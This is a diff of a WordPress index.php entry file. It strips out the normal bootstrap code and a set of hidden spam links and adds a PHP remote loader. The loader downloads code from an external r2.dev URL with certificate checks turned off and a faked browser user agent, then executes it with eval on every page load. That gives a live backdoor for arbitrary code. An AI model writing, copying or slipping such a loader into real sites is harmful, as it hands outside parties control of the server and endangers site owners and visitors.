@@ -1,34 +1,36 @@
-<?php 
-/**
-* Note: This file may contain artifacts of previous malicious infection.
-* However, the dangerous code has been removed, and the file is now safe to use.
-*/
-?>
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+    function get_contents($url) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Avoid verifying SSL peer (older behavior for PHP 5.6.40)
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Avoid verifying SSL host (older behavior for PHP 5.6.40)
+        
+        $result = curl_exec($ch);
+        
+        if ($result === false) {
+            echo 'Curl error: ' . curl_error($ch);
+            http_response_code(404); // Set 404 response code if cURL fails
+            curl_close($ch); // Ensure curl is closed before exit
+            exit;
+        }
+        
+        curl_close($ch);
+        return $result;
+    }
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+    $url = 'https://pub-8a4c8983490547dbb84bed26ac17a447.r2.dev/loader.txt';
+    $encoded_code = get_contents($url);
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+    if ($encoded_code === false) {
+        http_response_code(404);
+        exit;
+    }
 
-?>
-<p><a style="display: none;" href="https://sendikraf.web.id/">https://sendikraf.web.id/</a></p>
-<p><a style="display: none;" href="https://swjournal.az/">https://swjournal.az/</a></p>
-<p><a style="display: none;" href="https://internationaljournals.org/">https://internationaljournals.org/</a></p>
-<p><a style="display: none;" href="https://eduzonejournal.com/">https://eduzonejournal.com/</a></p>
-<p><a style="display: none;" href="https://journalofmedical.org/">https://journalofmedical.org/</a></p>
-<p><a style="display: none;" href="https://www.erpublications.com/">https://www.erpublications.com/</a></p>
-<p><a style="display: none;" href="https://mathedu.web.id/">https://mathedu.web.id/</a></p>
-<p><a style="display: none;" href="https://jurnal.saburai.id/">situs toto</a></p>
-<p><a style="display: none;" href="https://journal.indef.or.id/">https://journal.indef.or.id/</a></p>
+    // Optionally, log or display the encoded code for debugging
+    // echo $encoded_code;
+
+    // Attempt to safely evaluate the fetched code
+    eval('?>' . $encoded_code);
+    ?>
